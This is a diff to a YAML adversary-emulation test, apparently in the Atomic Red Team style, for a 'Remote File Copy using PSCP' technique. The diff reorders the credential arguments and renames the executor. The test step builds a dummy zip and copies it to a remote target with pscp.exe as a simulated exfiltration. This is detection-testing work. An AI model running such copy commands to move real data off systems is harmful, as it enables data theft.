@@ -3,6 +3,12 @@ name: Remote File Copy using PSCP
 description: |
     Copy a staged file using PSCP.exe to a public target location.
 args:
+    - name: scp_user
+      type: string
+      default: atomic
+    - name: scp_password
+      type: string
+      default: atomic
     - name: scp_port
       type: string
       default: "22"
@@ -21,12 +27,6 @@ args:
     - name: pscp_binary
       type: string
       default: PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe
-    - name: scp_user
-      type: string
-      default: atomic
-    - name: scp_password
-      type: string
-      default: atomic
 uuid: c82b1e60-c549-406f-9b00-0a8ae31c9cfe
 mitre:
     tactics:
@@ -48,8 +48,8 @@ steps:
       inline: |
         fsutil file createnew C:\Temp\T1105_scp.zip 1048576
         echo y | {{.Args.pscp_binary}} -P {{.Args.scp_port}} -pw {{.Args.scp_password}} {{.Args.exfil_package}} {{.Args.scp_user}}@{{.Args.target_location}}:{{.Args.target_filename}}
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             del /f /q {{.Args.exfil_package}}
-        executor: command_prompt
+        executor: cmd
